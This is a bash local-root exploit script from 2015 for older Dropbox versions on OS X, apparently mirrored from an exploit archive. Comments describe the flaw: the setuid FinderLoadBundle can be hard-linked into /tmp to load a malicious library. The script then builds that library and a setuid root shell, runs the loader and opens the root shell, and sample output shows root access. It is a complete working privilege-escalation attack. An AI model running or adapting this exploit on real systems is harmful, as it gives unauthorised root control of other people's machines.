#!/bin/bash
 
# Exploit Title: Dropbox FinderLoadBundle OS X local root exploit
# Google Dork: N/A
# Date: 29/09/15
# Exploit Author: cenobyte
# Vendor Homepage: https://www.dropbox.com
# Software Link: N/A
# Version: Dropbox 1.5.6, 1.6-7.*, 2.1-11.*, 3.0.*, 3.1.*, 3.3.*
# Tested on: OS X Yosemite (10.10.5)
# CVE: N/A
 
#
#      Dropbox FinderLoadBundle OS X local root exploit by cenobyte 2015
#                        <vincitamorpatriae@gmail.com>
#
# - vulnerability description:
# The setuid root FinderLoadBundle that was included in older DropboxHelperTools
# versions for OS X allows loading of dynamically linked shared libraries
# that are residing in the same directory. The directory in which
# FinderLoadBundle is located is owned by root and that prevents placing
# arbitrary files there. But creating a hard link from FinderLoadBundle to
# somewhere in a directory in /tmp circumvents that protection thus making it
# possible to load a shared library containing a payload which creates a root
# shell.
#
# - vulnerable versions: | versions not vulnerable:
# Dropbox 3.3.* for Mac  | Dropbox 3.10.* for Mac
# Dropbox 3.1.* for Mac  | Dropbox 3.9.* for Mac
# Dropbox 3.0.* for Mac  | Dropbox 3.8.* for Mac
# Dropbox 2.11.* for Mac | Dropbox 3.7.* for Mac
# Dropbox 2.10.* for Mac | Dropbox 3.6.* for Mac
# Dropbox 2.9.* for Mac  | Dropbox 3.5.* for Mac
# Dropbox 2.8.* for Mac  | Dropbox 3.4.* for Mac
# Dropbox 2.7.* for Mac  | Dropbox 3.2.* for Mac
# Dropbox 2.6.* for Mac  | Dropbox 1.5.1-5 for Mac
# Dropbox 2.5.* for Mac  | Dropbox 1.4.* for Mac
# Dropbox 2.4.* for Mac  | Dropbox 1.3.* for Mac
# Dropbox 2.3.* for Mac  |
# Dropbox 2.2.* for Mac  |
# Dropbox 2.1.* for Mac  |
# Dropbox 1.7.* for Mac  |
# Dropbox 1.6.* for Mac  |
# Dropbox 1.5.6 for Mac  |
#
# The vulnerability was fixed in newer DropboxHelperTools versions as of 3.4.*.
# However, there is no mention of this issue at the Dropbox release notes:
# https://www.dropbox.com/release_notes
#
# It seems that one of the fixes implemented in FinderLoadBundle is a
# check whether the path of the bundle is a root owned directory making it
# impossible to load arbitrary shared libraries as a non-privileged user.
# 
# I am not sure how to find the exact version of the FinderLoadBundle executable
# but the included Info.plist contained the following key:
# <key>CFBundleShortVersionString</key>
# This key is no longer present in the plist file of the latest version. So I
# included a basic vulnerable version checker that checks for the presence of
# this key.
#
# - exploit details:
# I wrote this on OS X Yosemite (10.10.5) but there are no OS specific features
# used. This exploit relies on Xcode for the shared library + root shell to be
# compiled. After successful exploitation a root shell is left in a directory in
# /tmp so make sure you delete it on your own system when you are done testing. 
#
# - example:
# $ ./dropboxfinderloadbundle.sh 
# Dropbox FinderLoadBundle OS X local root exploit by cenobyte 2015
#
# [-] creating temporary directory: /tmp/c7a15893fc1b28d31071c16c6663cbf3
# [-] linking /Library/DropboxHelperTools/Dropbox_u501/FinderLoadBundle
# [-] constructing bundle
# [-] creating /tmp/c7a15893fc1b28d31071c16c6663cbf3/boomsh.c
# [-] compiling root shell
# [-] executing FinderLoadBundle using root shell payload
# [-] entering root shell
# bash-3.2# id -P
# root:********:0:0::0:0:System Administrator:/var/root:/bin/sh
 
readonly __progname=$(basename $0)
 
errx() {
    echo "$__progname: $@" >&2
    exit 1
}
 
main() {
    local -r tmp=$(head -10 /dev/urandom | md5)
    local -r helpertools="/Library/DropboxHelperTools"
    local -r bundle="/tmp/$tmp/mach_inject_bundle_stub.bundle/Contents/MacOS"
    local -r bundletarget="$bundle/mach_inject_bundle_stub"
    local -r bundlesrc="${bundletarget}.c"
    local -r sh="/tmp/$tmp/boomsh"
    local -r shsrc="${sh}.c"
    local -r cfversion="CFBundleShortVersionString"
    local -r findbin="FinderLoadBundle"
 
    echo "Dropbox $findbin OS X local root exploit by cenobyte 2015"
    echo
 
    uname -v | grep -q ^Darwin || \
        errx "this Dropbox exploit only works on OS X"
 
    [ ! -d "$helpertools" ] && \
        errx "$helpertools does not exist"
 
    which -s gcc || \
        errx "gcc not found"
 
    found=0
    for finder in $(ls $helpertools/Dropbox_u*/$findbin); do
        stat -s "$finder" | grep -q "st_mode=0104"
        if [ $? -eq 0 ]; then
            found=1
            break
        fi
    done
 
    [ $found -ne 1 ] && \
        errx "couldn't find a setuid root $findbin"
 
    local -r finderdir=$(dirname $finder)
    local -r plist="${finderdir}/DropboxBundle.bundle/Contents/Info.plist"
     
    [ -f "$plist" ] || \
        errx "FinderLoadBundle not vulnerable (cannot open $plist)"
 
    grep -q "<key>$cfversion</key>" "$plist" || \
        errx "FinderLoadBundle not vulnerable (plist missing $cfversion)"
 
    echo "[-] creating temporary directory: /tmp/$tmp"
    mkdir /tmp/$tmp || \
        errx "couldn't create /tmp/$tmp"
 
    echo "[-] linking $finder"
    ln "$finder" "/tmp/$tmp/$findbin" || \
        errx "ln $finder /tmp/$tmp/$findbin failed"
     
    echo "[-] constructing bundle"
    mkdir -p "$bundle" || \
        errx "cannot create $bundle"
 
    echo "#include <sys/stat.h>" > "$bundlesrc"
    echo "#include <sys/types.h>" >> "$bundlesrc"
    echo "#include <stdlib.h>" >> "$bundlesrc"
    echo "#include <unistd.h>" >> "$bundlesrc"
    echo "extern void init(void) __attribute__ ((constructor));" >> "$bundlesrc"
    echo "void init(void)" >> "$bundlesrc"
    echo "{" >> "$bundlesrc"
    echo "  setuid(0);" >> "$bundlesrc"
    echo "  setgid(0);" >> "$bundlesrc"
    echo "  chown(\"$sh\", 0, 0);" >> "$bundlesrc"
    echo "  chmod(\"$sh\", S_ISUID|S_IRWXU|S_IXGRP|S_IXOTH);" >> "$bundlesrc"
    echo "}" >> "$bundlesrc"
 
    echo "[-] creating $shsrc"
    echo "#include <unistd.h>" > "$shsrc"
    echo "#include <stdio.h>" >> "$shsrc"
    echo "#include <stdlib.h>" >> "$shsrc"
    echo "int" >> "$shsrc"
    echo "main()" >> "$shsrc"
    echo "{" >> "$shsrc"
    echo "  setuid(0);" >> "$shsrc"
    echo "  setgid(0);" >> "$shsrc"
    echo "  system(\"/bin/bash\");" >> "$shsrc"
    echo "  return(0);" >> "$shsrc"
    echo "}" >> "$shsrc"
 
    echo "[-] compiling root shell"
    gcc "$shsrc" -o "$sh" || \
    errx "gcc failed for $shsrc"
 
    gcc -dynamiclib -o "$bundletarget" "$bundlesrc" || \
        errx "gcc failed for $bundlesrc"
 
    echo "[-] executing $findbin using root shell payload"
    cd "/tmp/$tmp"
    ./$findbin mach_inject_bundle_stub.bundle 2>/dev/null 1>/dev/null
    [ $? -ne 4 ] && \
        errx "exploit failed, $findbin seems not vulnerable"
 
    [ ! -f "$sh" ] && \
        errx "$sh was not created, exploit failed"
 
    stat -s "$sh" | grep -q "st_mode=0104" || \
        errx "$sh was not set to setuid root, exploit failed"
    echo "[-] entering root shell"
 
    "$sh"
}
 
main "$@"
 
exit 0

# milw00rm.org [2015-10-02]

